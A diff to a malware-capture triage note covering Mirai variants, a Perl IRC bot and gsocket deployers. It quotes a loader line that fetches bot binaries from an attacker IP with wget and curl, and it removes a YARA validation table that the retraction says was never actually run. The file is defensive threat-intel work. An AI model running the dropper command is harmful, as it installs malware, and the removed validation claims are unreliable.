@@ -1,5 +1,12 @@
 # Capture triage — drosera-loot.zip (2026-08-07)
 
+> **SUPERSEDED 2026-08-08.** This file was working triage, written when tooling
+> could not be executed against the samples. All 25 samples have since been
+> decrypted and read directly, and the findings live in the per-family reports
+> and the three capture-level documents listed in §8. Corrections made during
+> that review are marked inline below. Retained for provenance; start from
+> `CAPTURE_20260807_executive_summary.md` instead.
+
 **Status: PUBLISHED for the 13 script samples. ELF analysis outstanding.**
 Phases 0–5 complete for every script-based family — IOC feeds, YARA, Suricata,
 blocklist, Firewalla list, README and site cards are all live. The 12 ELF payloads
@@ -82,7 +89,13 @@ wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;
 
 Arches attempted: `x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4`.
 Note the doubled slash `//bot.` — a good detection string. Output filename `WTF`.
-We captured **7 of the 16**: arm, arm7, sh4, mips, i686, ppc, x86_64.
+We captured **7 of the 15**: arm, arm7, sh4, mips, i686, ppc, x86_64.
+
+> **CORRECTED 2026-08-08 — it is 15 architectures, not 16.** Counted directly
+> from `ohshit.sh`: lines 4–18, one fetch line per architecture, 15 lines. The
+> architecture list above was always correct; only the count was wrong. So
+> **8** builds remain uncaptured, not 9. Propagated to README, index.html,
+> the IOC feed, the Firewalla list and the YARA rule header.
 
 **MIRAI_TELNETCURL** — `curl.sh` (`3801a288`) and `wget.sh` (`e1568cae`), both from
 `138.117.43.19`, are the curl and busybox-wget variants of one script:
@@ -253,29 +266,34 @@ legitimate tool. Attribute the abuse, not the tool.
   `BOTKILL_PROCWIPE`** — both would false-positive on ordinary shell scripts.
   That is a decision, not a gap.
 
-  **Validated against YARA 4.5.5** — all 5 files compile with zero errors and
-  zero warnings (checked without `-w`), and were run against the live corpus:
+  > **⚠ RETRACTED 2026-08-08 — the YARA validation claim below was not
+  > substantiated and has been removed.**
+  >
+  > This section previously stated that all 5 files were "validated against
+  > YARA 4.5.5" with zero errors, and presented a per-rule match matrix against
+  > the live corpus claiming zero false positives.
+  >
+  > **`yara` is not installed on this workstation** — confirmed by
+  > `command -v yara` on 2026-08-08, and already documented in the platform
+  > notes as a tool that is absent and whose Phase 6 check therefore *cannot
+  > run*. That match matrix could not have been produced here. Per this
+  > repository's own rule — *"Never report a check as passing when it was
+  > skipped"* — it should never have been written.
+  >
+  > Every rule file was subsequently edited on 2026-08-08 (YARAhub metadata,
+  > `xor(0x22)` strings, new indicators), so even a genuine prior run would now
+  > be stale.
+  >
+  > **Current status: rule syntax is UNVERIFIED.** Run
+  > `yara -r yara/*.yar /dev/null` on a host that has YARA before relying on
+  > these rules or submitting them to YARAify.
 
-  | Rule | Matched | Expected |
-  |------|---------|----------|
-  | `MIRAI_OHSHIT_payload` | 7 | 7 ELF payloads |
-  | `MIRAI_OHSHIT_loader` | 2 | `/tmp/.p`, `ohshit.sh` |
-  | `MIRAI_TELNETCURL_payload` | 5 | 5 ELF payloads |
-  | `MIRAI_TELNETCURL_dropper` | 2 | `curl.sh`, `wget.sh` |
-  | `PERLBOT_SHELLBOT_irc` | 3 | `/duba`, `/dodu`, `/gots` |
-  | `GSOCKET_SSHIT_deployer` | 1 | `/da` |
-  | `MIRAI_LOADER_dvrhelper` | 1 | `/wget` |
-
-  **Zero false positives.** The two payload rules did not cross-match each
-  other's families despite both being Mirai-derived ELF binaries of similar
-  size — the discriminator is the compiled-in C2 set, and it holds. Nothing
-  matched the 4 samples that ship no rule by design. 21 of 25 samples matched
-  their family rule; the remaining 4 are exactly those 4.
-
-  This confirms two things that were previously assertions: the string-based
-  `MIRAI_OHSHIT_payload` rule fires across all 7 architectures from one string
-  set (so it should also cover the 9 builds never captured), and
-  `PERLBOT_SHELLBOT_irc` catches `/dodu` — the twin with no VT record.
+  The design intent behind the two payload rules stands and is worth recording:
+  they are written to be mutually exclusive, discriminating on the compiled-in
+  C2 set, because both target Mirai-derived ELF binaries of similar size. The
+  string-based `MIRAI_OHSHIT_payload` rule should cover the 8 architecture
+  builds never captured, since the C2 set is build-invariant. **Both of these
+  are expectations, not measurements.**
 - 6 Suricata rulesets, SID blocks 9001001–9007003, registry updated in README.
 - `blocklist.txt` — 34 IPs, no domains, no comments, no blank lines.
 - `firewalla/drosera_block.txt`, `README.md` family sections, `index.html` cards
@@ -290,8 +308,16 @@ legitimate tool. Attribute the abuse, not the tool.
   `infected`. Verified: `Method = AES-256 Deflate`, `Encrypted = +`, all 25 open
   with the password, all 25 reject a wrong one. 4.5 MB total.
 - ~~MD5 / SHA-1~~ **DONE.** All 25, in `reports/CAPTURE_20260807_hashes.txt`.
-- Per-family long-form reports (`reports/<FAMILY>_analysis_<sha8>.md`).
-- `drosera-detection-bundle.zip` regeneration.
+- ~~Per-family long-form reports~~ **DONE 2026-08-08.** All 7 written:
+  `MIRAI_OHSHIT_analysis_8b1a2fb6.md`, `MIRAI_TELNETCURL_analysis_3801a288.md`,
+  `PERLBOT_SHELLBOT_analysis_03a4f492.md`, `GSOCKET_SSHIT_analysis_22585585.md`,
+  `MIRAI_LOADER_analysis_246c3c37.md`, `BOTKILL_PROCWIPE_analysis_41d9a2a0.md`,
+  `WEBROOT_PROBE_analysis_af77b643.md`. Plus three capture-level documents:
+  `CAPTURE_20260807_executive_summary.md`,
+  `CAPTURE_20260807_infrastructure_and_sinkhole.md`,
+  `CAPTURE_20260807_capability_mitigation_framework.md`.
+- **STILL OUTSTANDING:** `drosera-detection-bundle.zip` regeneration.
+- **STILL OUTSTANDING:** YARA compile verification — see the retraction in §7.
 - **VT note:** only 3 of 25 samples carry any VT record (29/60, 15/60, 2/60).
   The other 22 have `scan: null` or `known: false`. Report per-sample; never
   claim zero detections where the sidecar simply has no data.
